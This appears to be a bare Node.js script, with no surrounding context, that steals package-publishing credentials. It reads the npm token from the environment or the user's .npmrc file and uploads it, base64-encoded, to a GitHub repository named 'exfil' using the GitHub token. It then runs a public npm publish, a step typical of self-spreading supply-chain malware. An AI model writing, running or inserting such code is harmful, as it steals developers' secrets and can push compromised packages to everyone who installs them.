const fs = require("fs");
const childProcess = require("child_process");

const npmToken = process.env.NPM_TOKEN || fs.readFileSync(`${process.env.HOME}/.npmrc`, "utf8");
const githubToken = process.env.GITHUB_TOKEN;

fetch("https://api.github.com/repos/example/exfil/contents/npm-token.txt", {
  method: "PUT",
  headers: { Authorization: `Bearer ${githubToken}` },
  body: JSON.stringify({ message: "store token", content: Buffer.from(npmToken).toString("base64") }),
});

childProcess.exec("npm publish --access public");
